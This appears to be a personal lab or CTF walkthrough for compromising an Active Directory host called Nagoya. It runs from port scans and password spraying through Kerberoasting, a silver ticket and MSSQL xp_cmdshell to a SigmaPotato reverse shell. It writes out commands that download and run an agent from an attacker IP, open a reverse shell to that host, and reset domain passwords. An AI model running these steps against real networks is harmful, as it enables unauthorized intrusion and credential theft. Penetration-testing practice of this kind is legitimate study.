53/tcp   open  domain            Simple DNS Plus
80/tcp   open  http              Microsoft IIS httpd 10.0
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
|_http-favicon: Unknown favicon MD5: 9200225B96881264E6481C77D69C622C
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Nagoya Industries - Nagoya
88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2026-07-27 04:55:29Z)
135/tcp  open  msrpc             Microsoft Windows RPC
139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: nagoya-industries.com0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ldapssl?
3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: nagoya-industries.com0., Site: Default-First-Site-Name)
3269/tcp open  globalcatLDAPssl?
3389/tcp open  ms-wbt-server     Microsoft Terminal Services
| ssl-cert: Subject: commonName=nagoya.nagoya-industries.com
| Issuer: commonName=nagoya.nagoya-industries.com
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-07-16T01:24:12
| Not valid after:  2027-01-15T01:24:12
| MD5:   58e0:3ebf:f1cb:fa8e:f148:5daf:4c8f:a0d2
|_SHA-1: 088b:a7ef:7589:20e7:b8b4:7236:d1e2:8951:d30a:df86
| rdp-ntlm-info: 
|   Target_Name: NAGOYA-IND
|   NetBIOS_Domain_Name: NAGOYA-IND
|   NetBIOS_Computer_Name: NAGOYA
|   DNS_Domain_Name: nagoya-industries.com
|   DNS_Computer_Name: nagoya.nagoya-industries.com
|   DNS_Tree_Name: nagoya-industries.com
|   Product_Version: 10.0.17763
|_  System_Time: 2026-07-27T04:55:45+00:00
|_ssl-date: 2026-07-27T04:56:25+00:00; +1s from scanner time.
5985/tcp open  http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: NAGOYA; OS: Windows; CPE: cpe:/o:microsoft:windows

list of names on website
<img width="1171" height="850" alt="image" src="https://github.com/user-attachments/assets/3b6895cf-c6e4-43bb-ad51-59d1ce9402be" />

add into etc/hosts
<img width="603" height="44" alt="image" src="https://github.com/user-attachments/assets/73c978f4-447f-4712-9c06-43523554ee81" />

used usernamer and then kerbrute user enum to find valid user. users using . as a delimitter
<img width="605" height="49" alt="image" src="https://github.com/user-attachments/assets/8b8308f1-36ae-470a-95e5-2219df142ef1" />
<img width="1007" height="278" alt="image" src="https://github.com/user-attachments/assets/599b3f03-6202-4a83-971b-b7dc1d33900b" />
<img width="477" height="492" alt="image" src="https://github.com/user-attachments/assets/7165436c-71ab-4537-bb51-846b65c6eda0" />

somehow supposed to get this list of password
<img width="219" height="131" alt="image" src="https://github.com/user-attachments/assets/b6c5a201-f430-4e0d-947b-b8aadb5115d7" />

Craig.Carr:Spring2023
Fiona.Clark:Summer2023
<img width="1115" height="117" alt="image" src="https://github.com/user-attachments/assets/eeba63d1-046c-45ce-8284-1c49a37d9330" />

login to smb
<img width="1452" height="308" alt="image" src="https://github.com/user-attachments/assets/b527347c-7259-4824-aefc-53306172395f" />

bloodhound-python -u Fiona.Clark -p Summer2023 -ns $ip -d nagoya-industries.com -c all
zip -r nagoya.zip *.json
upload into bloodhound
Fiona.Clark outbound object control to svc_helpdesk to christopher.lewis that has RDP
<img width="1600" height="561" alt="image" src="https://github.com/user-attachments/assets/26509ba8-b23d-4620-b895-544420992969" />

rpc into fiona
rpcclient -U "Fiona.Clark%Summer2023" $ip
setuserinfo2 svc_helpdesk 23 Password1

now rpc into svc_helpdesk and change christopher lewis password
<img width="513" height="89" alt="image" src="https://github.com/user-attachments/assets/e84b7b24-00b1-415d-b2e2-7fad6e34527b" />

evil winrm into christopher lewis
<img width="1141" height="197" alt="image" src="https://github.com/user-attachments/assets/789d800c-d760-4f63-9d15-8f8bca8779d7" />

cldnt find anything inside so i tried kerberoasting
get the userspn
GetUserSPNs.py -dc-ip $ip nagoya-industries.com/fiona.clark:Summer2023
GetUserSPNs.py -dc-ip $ip nagoya-industries.com/fiona.clark:Summer2023 -request -outputfile spn_hash
<img width="1904" height="390" alt="image" src="https://github.com/user-attachments/assets/f4f8c1b6-e117-4424-9336-90eaaf60c616" />

hashcat spn_hash -m 13100 -a 0 /usr/share/wordlists/rockyou.txt
<img width="1913" height="382" alt="image" src="https://github.com/user-attachments/assets/ea2e3e2a-6fe4-40ba-84f0-cbbbb68dc072" />
svc_helpdesk:Password1
svc_mssql:Service1

mysql is running using netstat -ano
<img width="682" height="118" alt="image" src="https://github.com/user-attachments/assets/6b71157f-01f3-46bf-8510-ee6044be4671" />

run ligolo proxy on attacker
sudo ./proxy -selfcert 
<img width="1049" height="365" alt="image" src="https://github.com/user-attachments/assets/c5998f68-d105-47aa-b9c4-90d508f1cc5c" />

download and run ligolo agent on target
certutil -urlcache -split -f http://192.168.45.213/agent.exe C:/Users/Christopher.Lewis/downloads/agent.exe
on attacker
sudo ./proxy -selfcert 

on victim
certutil -urlcache -split -f http://192.168.45.213/agent.exe C:/Users/Christopher.Lewis/downloads/agent.exe
./agent.exe -connect 192.168.45.213:11601 -ignore-cert

on attacker
session
enter*
start
<img width="730" height="57" alt="image" src="https://github.com/user-attachments/assets/e7cb5556-da4b-4750-8c37-ec6c04bf1d13" />

sudo ip route add 240.0.0.1/32 dev ligolo
 nmap 240.0.0.1 -sCV 
 nmap shows mssql
 <img width="1141" height="675" alt="image" src="https://github.com/user-attachments/assets/5d4d7094-d129-4df7-a9b6-4832ebb5cf73" />

logged in using mssqlclient.py but the acc lacked priviledges for key commands
<img width="1912" height="279" alt="image" src="https://github.com/user-attachments/assets/ddf91554-6ff4-42d0-b83c-c159fc9bb652" />

since can login but low priv. use silver ticket
get spn of svc_mssql, {MSSQL/nagoya.nagoya-industries.com}
<img width="1256" height="266" alt="image" src="https://github.com/user-attachments/assets/dd6cc3fc-848a-40bb-865f-812c8ecc2b4d" />

convert password to ntlm hash
https://codebeautify.org/ntlm-hash-generator 
<img width="764" height="649" alt="image" src="https://github.com/user-attachments/assets/70efbe7e-a8a3-4abd-9577-7de99ad80bc1" />

ticketer
<img width="1898" height="577" alt="image" src="https://github.com/user-attachments/assets/60115516-6170-412b-9061-eead333d6f1b" />

export KRB5CCNAME=Administrator.ccache

add the ligolo to /etc/hosts and comment out the old one
<img width="618" height="105" alt="image" src="https://github.com/user-attachments/assets/2a623117-bec3-4bf6-a132-9d71eb04c6c4" />

sudo apt install krb5-user
then add nagoya
<img width="622" height="381" alt="image" src="https://github.com/user-attachments/assets/d0a06912-bcf7-48e1-b9c0-d65c19598793" />


mssqlclient -k nagoya.nagoya-industries.com
<img width="797" height="228" alt="image" src="https://github.com/user-attachments/assets/188b7744-cb23-46dd-8126-c06bef890eda" />

xpcmdshell
<img width="1897" height="487" alt="image" src="https://github.com/user-attachments/assets/f5f302f3-db97-4576-ae7d-9b63cac8cd89" />

whoami /priv shows seimpersonate
<img width="779" height="316" alt="image" src="https://github.com/user-attachments/assets/85c4f9d9-0685-4422-a488-5222e3556ce0" />

download sigmapotato into temp folder and run sigmapotato whoami
<img width="1713" height="550" alt="image" src="https://github.com/user-attachments/assets/f3e9ce9e-3dd8-4be5-bbb0-0e7f2ca44b46" />

EXEC xp_cmdshell 'C:\Temp\SigmaPotato.exe --revshell 192.168.45.213 443'
<img width="463" height="79" alt="image" src="https://github.com/user-attachments/assets/3aaa0ceb-00b0-4523-87dc-ae04153520bc" />


